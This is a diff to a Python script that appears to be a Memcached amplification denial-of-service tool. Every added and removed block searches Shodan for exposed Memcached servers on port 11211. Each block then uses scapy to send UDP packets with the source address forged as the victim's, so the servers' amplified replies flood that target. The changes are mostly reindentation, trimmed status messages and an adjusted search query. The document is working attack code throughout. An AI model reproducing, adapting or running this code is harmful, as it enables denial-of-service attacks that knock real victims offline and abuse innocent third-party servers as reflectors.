@@ -104,91 +104,74 @@ while True:
                 print('100')
 
                 results = api.search('-has_ipv6:true product:"Memcached" port:11211')
-		            print('[✓] API Key Authentication: SUCCESS')
-		            print('[~] Number of bots: %s' % results['total'])
-		            print('')
-		            print(results['matches'])
-		            print('')
-		            for result in results['matches']:
-		                if power>1:
-		                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-		                    with suppress_stdout():
-		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-		                elif power==1:
-		                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-		                    with suppress_stdout():
-		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-		            print('200')
+                print(results['matches'])
+                print('')
+                for result in results['matches']:
+                    if power>1:
+                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+                        with suppress_stdout():
+                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                    elif power==1:
+                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+                        with suppress_stdout():
+                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                print('200')
+    
+                results = api.search('-has_ipv6:true port:11211 product:"Memcached"')
+                print(results['matches'])
+                print('')
+                for result in results['matches']:
+                    if power>1:
+                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+                        with suppress_stdout():
+                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                    elif power==1:
+                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+                        with suppress_stdout():
+                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                print('300')
 
-		        results = api.search('-has_ipv6:true port:11211 product:"Memcached"')
-		            print('[✓] API Key Authentication: SUCCESS')
-		            print('[~] Number of bots: %s' % results['total'])
-		            print('')
-		            print(results['matches'])
-		            print('')
-		            for result in results['matches']:
-		                if power>1:
-		                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-		                    with suppress_stdout():
-		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-		                elif power==1:
-		                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-		                    with suppress_stdout():
-		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-		            print('300')
+                results = api.search('product:"Memcached" -has_ipv6:true port:11211')
+                print(results['matches'])
+                print('')
+                for result in results['matches']:
+                    if power>1:
+                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+                        with suppress_stdout():
+                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                    elif power==1:
+                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+                        with suppress_stdout():
+                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                print('400')
+    
+                results = api.search('port:11211 -has_ipv6:true product:"Memcached"')
+                print(results['matches'])
+                print('')
+                for result in results['matches']:
+                    if power>1:
+                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+                        with suppress_stdout():
+                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                    elif power==1:
+                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+                        with suppress_stdout():
+                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                print('500')
 
-		        results = api.search('product:"Memcached" -has_ipv6:true port:11211')
-		            print('[✓] API Key Authentication: SUCCESS')
-		            print('[~] Number of bots: %s' % results['total'])
-		            print('')
-		            print(results['matches'])
-		            print('')
-		            for result in results['matches']:
-		                if power>1:
-		                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-		                    with suppress_stdout():
-		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-		                elif power==1:
-		                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-		                    with suppress_stdout():
-		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-		            print('400')
-
-		        results = api.search('port:11211 -has_ipv6:true port:11211 product:"Memcached"')
-		            print('[✓] API Key Authentication: SUCCESS')
-		            print('[~] Number of bots: %s' % results['total'])
-		            print('')
-		            print(results['matches'])
-		            print('')
-		            for result in results['matches']:
-		                if power>1:
-		                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-		                    with suppress_stdout():
-		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-		                elif power==1:
-		                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-		                    with suppress_stdout():
-		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-		            print('500')
-
-		        results = api.search('port:11211 product:"Memcached" -has_ipv6:true')
-		            print('[✓] API Key Authentication: SUCCESS')
-		            print('[~] Number of bots: %s' % results['total'])
-		            print('')
-		            print(results['matches'])
-		            print('')
-		            for result in results['matches']:
-		                if power>1:
-		                    print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
-		                    with suppress_stdout():
-		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-		                elif power==1:
-		                    print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
-		                    with suppress_stdout():
-		                        send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
-		            print('600')
-
-
+                results = api.search('port:11211 product:"Memcached" -has_ipv6:true')
+                print(results['matches'])
+                print('')
+                for result in results['matches']:
+                    if power>1:
+                        print('[+] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
+                        with suppress_stdout():
+                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                    elif power==1:
+                        print('[+] Sending 1 forged UDP packet to: %s' % result['ip_str'])
+                        with suppress_stdout():
+                            send(IP(src=target, dst='%s' % result['ip_str']) / UDP(dport=11211)/Raw(load=data), count=power)
+                print('600')
 
                 print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                 break
